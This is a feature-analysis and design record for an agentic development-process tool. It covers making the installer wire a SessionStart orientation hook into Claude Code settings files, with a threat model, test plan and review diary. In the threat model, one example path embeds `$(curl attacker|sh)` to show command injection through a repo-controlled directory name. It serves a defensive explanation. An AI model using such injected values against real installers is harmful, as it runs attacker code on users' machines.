---
id: F-036
feature: init.js wires the SessionStart orientation hook, so the recommended default stops being a manual step
status: COMPLETED
level: L3
start_date: 2026-08-25
end_date: 2026-08-25
---
# Feature Analysis: the orientation hook installs itself

## Objective

Field report: an agent worked a project that follows this process **without ever
invoking the skill**. Root cause found, and it is the same shape as F-035's — a promise
stated in doctrine with no mechanism behind it.

`ENFORCEMENT.md` §4 says, in bold: *"Wire it on every project that has `ai_docs/` and a
Python interpreter."* The hook itself is real, tested and fail-open (`cmd_orient`,
`sdlc_core.py:1878`). What is missing is anything that performs the wiring:

```
grep -rn "settings.json|SessionStart|hooks" scripts/*.js   ->  (no match)
```

`init.js`, `lib.js`, `postinstall.js` and `preuninstall.js` contain **zero** references
to a hook or a settings file, in all three distributions. So every project scaffolded by
`agentic-sdlc-init` / `kb-agentic-init` / `mkt-agentic-init` starts with no hook, and
"wire it on every project" is a step a human has to remember and therefore skips.

The invariant that appears to guard this guards only the prose:

```python
self.assertIn("## 4. SessionStart hook", t)      # test_skill_invariants.py:113
```

It asserts the documentation section exists and that `orient` runs. Nothing asserts any
project is wired. That is the hole the field incident fell through.

**What this unit does NOT claim.** A hook injects text; it cannot force a skill
invocation. This closes the gap between "documented default" and "installed default".
It does not make skipping the process impossible — see Non-Goals below, where the
mechanism that would is ruled out by the Vision.

## Feature Vision

Direct hit on the Goal *"Be installable, upgradable and maintainable by the people who
use it — on the clients they already run, **without hand-assembly**. Packaging,
distribution, installation and the product's own tests are part of the product, not
overhead outside it."* A wiring step performed by hand on every project is hand-assembly
by definition, and the field result is the defect this Goal exists to prevent.

Also serves *"Make the project's intent readable and operable by an agent that arrives
with no context"* — the hook is the only non-prompt carrier of that orientation
(`test_skill_invariants.py:258` already says so).

**Non-Goal check — the stronger mechanism is forbidden, and saying so is part of the
analysis.** A `PreToolUse` hook blocking every `Edit`/`Write` until a triage level is
declared would be real enforcement rather than a nudge. It is out under *"No ceremony
ratchet, at any level: a trivial change stays one step; any mechanism that makes trivial
edits pay a governance cost is out — added as a step, a required field, a check…"*. It
is not rejected on taste; it is rejected on the Vision, and it is recorded here so the
next person who has the same idea finds the ruling instead of re-deriving it.

**Ceremony budget.** This unit adds no step, field or check to any level of work. It
adds session-start read cost — which the Goal above already counts as part of the price
of the process — but that cost is unchanged from today for any project that followed
the documented default. What changes is who performs the wiring, not whether it happens.
No budget item.

**Non-Goal check — client coupling.** Writing `.claude/settings.json` touches a format
another project defines. Explicitly exempt: *"This rule does not reach the AI clients the
methodology runs on: conforming to a client's skill layout is how the product reaches
its users, and supporting one more of them is squarely wanted."*

## Use Cases / User Needs

- **Practitioner initializing a project** (Actor: the team lead) — gets the orientation
  hook working without reading `ENFORCEMENT.md` §4 and hand-editing JSON.
- **An agent arriving at that project with no context** — is oriented at session start
  whether or not it remembers to read `ai_docs/`, which is the whole point of the hook.
- **Practitioner re-running init** (upgrade, or a second lens) — is not given a
  duplicate hook entry, and nothing they wrote by hand is disturbed.
- **A teammate cloning the repo** — either inherits the wiring (when it is portable) or
  is told plainly that they need to run init on their own machine (when it is not).
- **Practitioner with no Python** — is told the hook was skipped and why, rather than
  getting a hook that fails at every session start.

## Capability Ledger

Architect pass run before the Impact. `scripts/` is ANALYZED in `audit_plan.md`.

| Capability | Verdict | Component / gap | Evidence |
|---|---|---|---|
| Add to a user-authored file **without clobbering it** | **EXISTS** | `gitattributes()` (`scripts/init.js:122-141`) | re-read: reads current content, returns early on a marker match, appends rather than rewrites, and no-ops when there is no `.git`. This is the precedent the new writer must follow — init.js already edits a user-authored file when the edit is additive and marker-guarded, so this is not a new licence |
| Locate the installed skill for a given client | **EXISTS** | `skillTarget(client)` (`lib.js:138-144`) | re-read: `path.join(client.home, ...subdir, INSTALLED_SKILL_NAME)`, honouring `skillsSubdir` and the client's `home` (env-var overridable). The validator is `<that>/scripts/sdlc_check.py` |
| Find a working Python interpreter | **EXISTS** | `init.js` §7 | re-read: loops `['python','python3','py']` with `execSync(..., {stdio:'ignore'})` and keeps the first that succeeds, already used to generate `INDEX.md`. The hook needs the SAME answer, so the loop must be lifted to a value rather than duplicated |
| Detect which clients are installed | **EXISTS** | `clientDetected(client)` (`lib.js`) | already gates the protocol-pointer writes at `init.js:159-165` |
| Write a client hook at init time | **MISSING** | — | searched `settings.json`, `SessionStart`, `hooks` across `scripts/*.js` in all three distributions: no match. Not provisional — `scripts/` is a fully analyzed area |
| Decide whether a hook command is **portable** to a teammate | **MISSING** | — | searched for any path-portability logic in the installers: none. The distinction is real and this repo already embodies it (below), but no code knows it |

## The portability split (the design decision this unit turns on)

The hook command names a validator, and where that validator lives decides which file
the hook may be written to. This repository already answers it, and the answer is
adopted rather than invented:

- **This repo's own committed hook** (`.claude/settings.json`) is
  `python "skills/agentic-sdlc-skill/scripts/sdlc_check.py" orient` — **repo-relative**,
  because this repo vendors the validator. `.gitignore:27-28` (`.claude/*` +
  `!.claude/settings.json`) deliberately commits that file so the wiring reaches every
  clone. F-016's analysis records exactly that reasoning.
- **A consumer project does not vendor the validator.** It lives at
  `~/.claude/skills/agentic-sdlc/scripts/sdlc_check.py` — an absolute, machine-specific,
  user-specific path. Committing that into the shared `settings.json` would hand every
  teammate a hook naming a directory that does not exist on their machine.

So the target file follows the command's portability:

| Case | Command | File | Why |
|---|---|---|---|
| Validator vendored in the repo (ENFORCEMENT §2) | repo-relative | `.claude/settings.json` | portable, belongs in the shared, committed layer — matches this repo |
| Validator only in the client's skills dir (the normal case) | absolute | `.claude/settings.local.json` | machine-specific, belongs in the git-ignored personal layer; each teammate runs init once |

## Impact

| Path | Change | Why |
|---|---|---|
| `scripts/init.js` | MODIFY | the wiring itself, plus lifting the Python-interpreter probe (§7) to a value both consumers share |
| `scripts/lib.js` | MODIFY | `wireOrientHook()` + `orientHookCommand()` live here: they need `CLIENTS`/`skillTarget`, and lib.js is where installer infrastructure already lives and where `test_clients.js` can reach them |
| `scripts/test_clients.js` | MODIFY | the battery for this code; `node:test`, dev-only, already the home of installer-lifecycle tests |
| `skills/agentic-sdlc-skill/ENFORCEMENT.md` | MODIFY | §4 stops presenting hand-wiring as the only path: init does it, the manual snippet becomes the fallback, and the settings.json vs settings.local.json rule is stated where the snippet is |
| `skills/agentic-sdlc-skill/scripts/test_skill_invariants.py` | MODIFY | the invariant that guards prose only (`:113`) gains a companion asserting the installer actually wires — closing the exact hole that let this ship |
| `.gitignore` (of the target project, at init time) | MODIFY | when the wiring lands in `settings.local.json`, that file must actually be ignored or T4 returns by the back door. Append-only and marker-guarded, exactly like the existing `gitattributes()` |
| `skills/*/scripts/shared_manifest.json` | MODIFY | **consequence, not choice**: `test_skill_invariants.py` is a drift-guarded shared file, so editing it forces `shared_files.py --update` and the regenerated manifest copied to all three. Missed in the first draft of this map |
| `ai_docs/audit/handoff.md`, `ai_docs/strategic/features_history.md`, `ai_docs/INDEX.md` | MODIFY | generated by `sdlc_check.py index`; never hand-edited |
| `CHANGELOG.md` | MODIFY | `[Unreleased]` |
| **×3 — the same six files in `distributions/kb-agentic-skill/` and `distributions/mkt-agentic-sdlc/`** | MODIFY | the defect is identical in all three lenses; fixing one and shipping two with a known gap is not an option |

**Blast radius (enumerated).**
- `init.js`, `lib.js` and `test_clients.js` are **per-distribution copies that have
  already diverged** — md5 and line counts differ across all three (`init.js` 245/237/235
  lines). `shared_manifest.json` does not list them, so **no drift guard covers them**:
  each copy must be edited and verified separately, and that fact is itself a hazard
  worth recording (named here, not fixed in this unit — folding the installers into the
  drift guard is its own change).
- `lib.js` exports are consumed by `init.js`, `postinstall.js`, `preuninstall.js` and
  `test_clients.js` (`grep` over `require('./lib')`). The change is **additive only** —
  two new exported functions, no existing signature touched — so no consumer moves.
- The Python-probe lift is the one edit inside existing control flow: §7 currently
  discovers the interpreter and immediately uses it. Hoisting the discovered value
  changes ordering (the probe must run before the hook wiring), so §7's `INDEX.md`
  generation must be verified to still run and still report identically.
- `cmd_orient` / `sdlc_core.py` are **not touched**: the hook's behaviour is unchanged,
  only its installation. The spine stays byte-identical across the three distributions.

## Security and Threat Model

Surface: writing a JSON configuration file inside the user's project that an AI client
will later execute commands from. That is the whole risk, and it is not small.

| Threat | Answer |
|---|---|
| **T1 — a hand-written `settings.json` is destroyed** (the user's permissions, env, other hooks) | never rewrite: parse, merge additively, preserve every key we did not add. Follows `gitattributes()`'s precedent exactly. **If the file exists and does not parse as JSON, write nothing at all** and print the snippet — a malformed or JSONC file is the case where a merge would silently discard the user's content |
| **T2 — re-running init duplicates the hook** | marker-guarded, like `gitattributes()`: if any existing SessionStart command already contains `sdlc_check.py` + `orient`, report "already wired" and return. Idempotence is asserted by a test that runs the writer twice |
| **T2b — "already wired" is reported for a hook that is wired and DEAD** | **the design's own near-miss, caught by the self-pass and confirmed in the field.** A bare marker match would look at a hook whose validator path no longer resolves, declare the project done, and preserve the exact silent failure this unit exists to remove. So the match is not enough: the existing command's validator path is extracted and checked on disk, and a hook that does not resolve is reported as **BROKEN** with the corrected command. It is never rewritten silently — the entry may have been hand-tuned — but it is never passed off as working either |
| **T3 — a hook is wired that cannot run**, failing at every session start | wire only when BOTH hold: the validator file exists on disk, and a Python interpreter was found. Otherwise print the snippet and say which precondition failed. A broken hook is worse than no hook — it trains the user to ignore hook output |
| **T4 — a machine-specific absolute path is committed**, breaking every teammate's session | the portability split above: an absolute command goes to the git-ignored `settings.local.json`, never to the shared `settings.json`. This is the threat that decided the design, not a mitigation bolted onto it |
| **T5 — command injection into a string the client later executes** | **restated after review: the first version of this row was answered for a design that no longer existed.** It said the path "comes from `os.homedir()` and the client roster, not from user input" — true of the absolute branch, and false of the vendored branch the portability split introduced in the same change. A vendored path is built from a directory name read out of the TARGET repository, so `skills/$(curl attacker|sh)/scripts/...` is repo-controlled input reaching a shell-executed command — and the vendored branch is the one that writes to the **committed** file. Two filters now: every vendored path segment must match `^[A-Za-z0-9._-]+$` (a name that fails simply is not a vendoring candidate, so the absolute branch takes over), and **any** resolved path containing `"`, `$`, a backtick, CR or LF is refused outright (`unsafe-path`). Backslash is deliberately allowed — a Windows path is full of them |
| **T9 — a settings shape the writer does not recognise is treated as empty** | found by review as live data loss: a hand-written `"SessionStart": {…}` (object rather than array) was replaced with `[]` and the file rewritten, reporting success. "I do not recognise this" now means `malformed` and **write nothing**, the same answer as unparseable JSON — never "therefore it is empty" |
| **T10 — the existing-hook scan reads only the file it decided to write** | a project that starts un-vendored (hook in `settings.local.json`) and later vendors flips the target to `settings.json`, finds nothing there, and appends a second hook. Both layers are now inspected before any write decision, so a hook in either one is found |
| **T11 — an unwritable settings file takes the whole installer down** | the write is the last step, after seed files already exist; an EACCES or a `.claude` that is a file would have thrown a stack trace and skipped the remaining init steps. Wrapped, returning `write-failed`, like every other branch |
| **T6 — the hook is wired into a client the user does not have** | gated on `clientDetected(client)`, the same gate the protocol pointers already use |
| **T7 — writing into `.claude/` when the user deliberately ignores that directory** | additive and reversible: a single JSON entry the user can delete. The message names the file written, so the action is never silent |
| **T8 — init runs outside a project root** and scribbles into an unrelated directory | unchanged from today: init already writes `ai_docs/` and protocol pointers to `cwd`; this adds no new reach |

## Action Plan

1. `lib.js` — `orientHookCommand({validatorPath, portable, hybrid})` and
   `wireOrientHook({cwd, client, ...})`, additive exports. RED first.
2. `init.js` — lift the interpreter probe to a value; call the writer for each detected
   client; report what was written, skipped, or must be pasted by hand.
3. `test_clients.js` — the battery (below).
4. Replicate verbatim into the kb and mkt distributions; diff the three to prove the
   helper is identical.
5. `ENFORCEMENT.md` §4 + `test_skill_invariants.py` invariant + CHANGELOG, ×3.
6. Full batteries ×3 + `node test_clients.js` ×3 + drift guard.

## Test Strategy

Both directions for every branch — F-027's lesson, and F-035's: the tests that would
still pass with the fix reverted are the ones that prove nothing.

- **Fresh project, no settings file** → file created, hook present, valid JSON.
- **Existing settings.json with unrelated keys** (`permissions`, `env`) → those keys
  survive byte-for-byte in value, hook added alongside. This is T1 and it is the test
  that matters most.
- **Existing settings.json that already has OTHER SessionStart hooks** → ours is
  appended, theirs still there.
- **Run twice** → exactly one hook entry; second run reports "already wired".
- **Malformed JSON** → file left BYTE-IDENTICAL, non-fatal, snippet printed. Asserted on
  the bytes, not on the exit code.
- **No Python / validator missing** → nothing written, snippet printed.
- **Portability**: vendored validator → repo-relative command in `settings.json`;
  non-vendored → absolute command in `settings.local.json`. Asserted on which FILE was
  written, since that is the T4 decision.
- **Invariant** (`test_skill_invariants.py`): the installer contains the wiring — the
  companion to the prose-only assertion at `:113`. Mutation: delete the call, the
  invariant fails.
- **Family**: batteries ×3, `node scripts/test_clients.js` ×3, drift guard identical.

## Diary / Current State

**2026-08-25 — closure review (rung 1): two independent subagents, FAIL, reworked.**
Different lenses (conformance / adversarial), run in parallel on the owner's
authorization. Between them: 5 BLOCK-class defects, converging independently on four.
Every blocker was reproduced by hand before being acted on, and **one reviewer's
evidence was wrong** — it claimed the field repository has no `skills/` directory, so
the writer would answer `wired` there; traced live, that repo does have
`skills/kb-agentic-skill/scripts/sdlc_check.py`, so it correctly returns `broken`. The
*class* of defect it named was real anyway, via the other reviewer's route (vendoring
adopted later flips the target file), and is fixed as T10.

Confirmed and fixed: silent data loss on an unrecognised `hooks` shape (verified: a
hand-written `SessionStart` object had its content destroyed while the call reported
success); `$(...)`/backtick/newline passing the one-character sanitiser into a command
written to the **committed** settings file; the validator-extraction regex reporting a
dead hook as healthy when the interpreter is quoted, and a healthy hook as broken when
nothing is quoted; the Python probe duplicated where this document said "lifted"; the
`skills/` -only vendoring scan missing `tools/`, which is the layout ENFORCEMENT §2
actually recommends; `.gitignore` skipped on the `already` path; and both new Python
invariants passing against the implementation they claimed to guard — one matched a
string that also occurs in a comment, the other a call that could simply be commented
out. Both are now matched against comment-stripped lines and mutation-tested in both
directions.

Two of the new tests failed on first run and **both were bugs in the tests, not the
code**: a helper that did not mirror the flat-array hook shape, and a fixture that used
the validator itself as the fake interpreter, so the token it was meant to reject
legitimately matched. Corrected rather than accommodated.

**2026-08-25 — design self-pass (rung 3), three findings, all folded above.**
1. *Verified, was asserted:* that Claude Code reads `hooks` from
   `settings.local.json` at all. The whole non-vendored path — the normal case —
   depends on it, and it had been assumed. Confirmed against the official settings
   documentation: `.claude/settings.local.json` is precedence level 3 ("You, this
   project"), the shared-settings section states teammates "can still override it for
   themselves in their own `.claude/settings.local.json`" for permissions, hooks,
   telemetry and plugins, and the live-reload path explicitly covers "user, project,
   local, and managed settings". The design stands, and now on evidence.
2. `.gitignore` was missing from the Impact: writing a machine-specific file into a
   project that does not ignore it re-opens T4 by the back door.
3. **T2b, the design's own near-miss** — see the threat table. Found by asking what the
   marker check would do on a hook that is present but broken, then confirmed in the
   field minutes later: the `kb-agentic-skill` repository has a wired SessionStart hook
   pointing at `skills/agentic-sdlc-skill/scripts/sdlc_check.py`, a path that does not
   exist there (the tree carries `skills/kb-agentic-skill/`). It runs every session,
   prints `can't open file`, and emits no orientation. That is T3 observed rather than
   hypothesised, and it is the most probable cause of the field incident that opened
   this unit: not a missing hook, but a hook that was wired and dead. A first draft of
   this design would have looked at it and said "already wired".

**2026-08-25 — opened.** Standalone, devPNT off. `Level: L3 · router: no match`
(`GUIDE_release.md` is the only guide and governs publishing).
Branch `feat/init-wires-orient-hook` off `main`@5f14f24.

Trigger: the owner reported an agent working a governed project without invoking the
skill. Rather than designing a new enforcement mechanism, the first move was to ask
whether the existing one was actually installed — and it was not, anywhere, by
construction.

The portability split was NOT in the original design. It came out of the threat model
(T4) and was then settled by evidence rather than judgement: this repo's committed
`.claude/settings.json` uses a repo-relative command, and `.gitignore` commits that file
on purpose, which only works because this repo vendors the validator. A consumer project
does not, so the same choice there would publish a machine-specific path to every
teammate. `ENFORCEMENT.md` §4's own worked example shows an absolute path with a
`<user>` placeholder and does not mention the distinction — so the doctrine had the same
gap, and §4 is in the Impact for that reason.
